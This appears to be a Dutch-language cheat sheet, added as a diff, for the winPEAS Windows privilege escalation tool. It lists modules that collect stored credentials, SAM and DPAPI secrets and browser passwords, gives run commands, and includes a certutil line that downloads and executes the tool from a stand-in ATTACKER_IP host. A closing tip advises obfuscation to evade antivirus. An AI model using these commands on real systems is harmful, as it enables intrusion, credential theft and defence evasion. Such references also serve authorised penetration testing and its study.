@@ -1,0 +1,52 @@
+# winPEAS — Windows Privilege Escalation Awesome Scripts
+# Uitgebreide enumeratie van privilege escalation vectoren op Windows
+#
+# === Syntax ===
+# winPEASx64.exe [opties] [modules]
+# winPEAS.bat (geen .NET nodig)
+#
+# === Modules ===
+# systeminfo          OS, patchniveau, environment info
+# userinfo            Huidige gebruiker, groepen, privileges
+# processinfo         Draaiende processen en services
+# servicesinfo        Service configuratie en permissions
+# applicationsinfo    Geinstalleerde software
+# networkinfo         Netwerk configuratie, open poorten, firewall
+# windowscreds        Opgeslagen credentials (vault, DPAPI, SAM)
+# browserinfo         Browser wachtwoorden en history
+# filesinfo           Interessante bestanden, writable paden
+# eventsinfo          Relevante event log entries
+#
+# === Belangrijkste opties ===
+# quiet               Minder output (aanbevolen)
+# notcolor            Geen kleuren (voor logging naar bestand)
+# wait                Wacht op user input bij elke sectie
+# log=FILE            Output naar bestand
+#
+# === Voorbeelden ===
+
+# Snelle scan met belangrijkste modules
+winPEASx64.exe quiet systeminfo userinfo servicesinfo
+
+# Volledige scan
+winPEASx64.exe quiet
+
+# Scan naar bestand opslaan
+winPEASx64.exe quiet notcolor log=C:\Windows\Tasks\winpeas.txt
+
+# Alleen credentials zoeken
+winPEASx64.exe quiet windowscreds browserinfo
+
+# Alleen services en bestanden
+winPEASx64.exe quiet servicesinfo filesinfo
+
+# .bat versie (als .NET niet beschikbaar is)
+winPEAS.bat
+
+# Remote downloaden en uitvoeren
+certutil -urlcache -f http://ATTACKER_IP/tools/winPEASx64.exe C:\Windows\Tasks\wp.exe
+C:\Windows\Tasks\wp.exe quiet
+
+# NOTE: Uitvoer is kleurgecodeerd: ROOD = bijna zeker exploiteerbaar
+# NOTE: Wordt vaak gedetecteerd door AV — gebruik obfuscation of .bat versie
+# NOTE: Combineer met SharpUp/PowerUp voor exploitatie na enumeratie
